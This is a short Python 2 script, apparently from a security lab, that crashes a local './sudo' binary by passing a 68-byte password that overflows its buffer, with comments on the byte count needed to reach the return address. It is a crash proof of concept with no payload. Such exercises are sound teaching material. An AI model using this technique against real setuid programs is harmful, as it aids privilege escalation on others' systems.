import os, sys, subprocess


PATH_TO_SUDO = './sudo'


def crash_sudo():
	cmd = "pwd" # arbitrary, just used to follow the proper usage of the program 
	password = "A" * 67 # we need at least 67 bytes to overflow RET register (python adds null char at the end of string)
	password += "z"
	print password
	subprocess.call([PATH_TO_SUDO, password, cmd])
	return


def main(argv):
    if not len(argv) == 1:
        print 'Usage: %s' % argv[0]
        sys.exit(1)

    crash_sudo()


if __name__ == '__main__':
    main(sys.argv)
